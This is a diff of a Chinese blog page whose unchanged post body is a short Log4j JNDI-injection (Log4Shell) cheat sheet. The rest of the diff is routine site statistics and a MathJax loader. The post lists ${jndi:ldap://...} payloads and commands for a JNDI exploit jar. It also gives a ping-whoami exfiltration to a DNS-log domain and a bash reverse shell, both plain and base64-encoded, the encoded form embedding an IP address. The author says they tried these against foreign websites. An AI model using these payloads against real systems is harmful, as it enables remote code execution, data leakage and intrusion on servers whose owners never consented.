@@ -300,7 +300,6 @@
       
         <p>程序在使用日志读取用户输入时，攻击者可以构造恶意代码${}</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://f03b65e6.dns.1433.eu.org./exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap://IP:1389/shzltp&#125;</span><br><span class="line">ldap://IP:1389/shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap://IP:1389/ojzxns&#125;</span><br><span class="line">ldap://IP:1389/ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash转码&quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping `whoami`.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>感觉对于一些小型企业基本不会去使用这个东西，对于大型站点可能会去使用，但是往往他们的防护也及时，今天下午试了一些国外站点，基本上都不出网没法成功利用。。。</p>
 
     </div>
@@ -446,7 +445,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -494,7 +493,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -508,7 +507,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -519,7 +518,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -659,6 +658,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
